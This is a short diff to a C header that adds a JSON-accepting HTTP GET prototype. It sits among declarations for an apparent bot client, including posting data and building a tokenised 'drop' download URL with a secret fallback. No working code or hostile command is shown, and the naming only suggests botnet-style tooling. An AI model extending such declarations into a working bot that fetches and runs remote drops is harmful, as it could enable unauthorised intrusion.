@@ -395,6 +395,9 @@ int http_post(notnet_bot_t *bot, const char *data, int len);
  * (the default build has no TLS); callers must NOT treat the transport as a
  * trust boundary. Returns -1 on failure, non-2xx, or empty body. */
 int http_get_url(notnet_bot_t *bot, const char *url, char *buf, int len);
+/* Variant that accepts JSON responses (used by the /bot/token fetch, whose
+ * successful reply IS JSON — #195's binary-blob check must not apply). */
+int http_get_url_json(notnet_bot_t *bot, const char *url, char *buf, int len);
 /* #190: drop URL builder — one-time download token with ?secret= fallback. */
 int build_drop_url(notnet_bot_t *bot, char *dl_url, size_t sz);
 int http_read(notnet_bot_t *bot, char *buf, int len);
